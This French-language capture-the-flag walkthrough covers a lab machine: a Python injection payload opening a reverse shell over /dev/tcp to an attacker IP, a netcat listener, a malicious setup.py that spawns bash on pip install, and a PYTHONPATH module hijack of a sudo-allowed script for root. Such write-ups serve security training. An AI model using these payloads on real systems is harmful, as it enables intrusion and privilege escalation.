# Years 5739 CTF Walkthrough

## Sommaire

1. [RCE via Injection Python](#1-rce-via-injection-python)
2. [Reverse Shell avec Netcat](#2-reverse-shell-avec-netcat)
3. [Installation du setup.py](#3-installation-du-setuppy)
4. [√âl√©vation avec backup.py](#4-√©l√©vation-avec-backuppy)

---

## 1. RCE via Injection Python

Sur le site web : `http://10.10.132.89:8080/index`, on identifie une vuln√©rabilit√© d'injection Python.

Payload utilis√© :

```python
__import__('subprocess').Popen(['bash', '-i', '-c', 'exec 5<>/dev/tcp/10.8.92.59/4444; cat <&5 | while read line; do $line 2>&5 >&5; done'], shell=False)
```

Ce payload ouvre une connexion TCP invers√©e vers notre machine.

## 2. Reverse Shell avec Netcat

Sur notre machine d‚Äôattaque, on √©coute le port 4444 :

```bash
nc -lvnp 4444
```

D√®s que la commande d‚Äôinjection est ex√©cut√©e, on obtient un shell distant.

üéâ **1er Flag obtenu**

## 3. Installation du setup.py

Depuis le shell obtenu, on se connecte √† un serveur Python (sur notre machine) et on t√©l√©charge un fichier `setup.py`.

```python
from setuptools import setup
import os

os.system("/bin/bash")

setup(
    name="evil_module",
    version="0.1",
    install_requires=[]
)
```

On installe ensuite le package comme l‚Äôutilisateur `cave-of-miracles` :

```bash
sudo -u cave-of-miracles pip3 install . -v
```

Cela nous donne un acc√®s shell avec l‚Äôutilisateur `cave-of-miracles`.

üéâ **2√®me Flag obtenu**

## 4. √âl√©vation avec backup.py

On v√©rifie les commandes sudo disponibles :

```bash
sudo -l
```

R√©sultat : on peut ex√©cuter `/opt/backup.py` en tant que root et contr√¥ler l‚Äôenvironnement Python.

On modifie un des modules import√©s par `backup.py`, par exemple en cr√©ant un faux module dans `/tmp` :

```python
# /tmp/fakemodule.py
import os
os.system("/bin/bash")
```

Puis on ex√©cute :

```bash
sudo PYTHONPATH=/tmp/ /usr/bin/python3 /opt/backup.py
```

Ce qui d√©clenche notre shell ‚Äî cette fois avec les **droits root** !

---

üéâ **3√®me Flag obtenu**
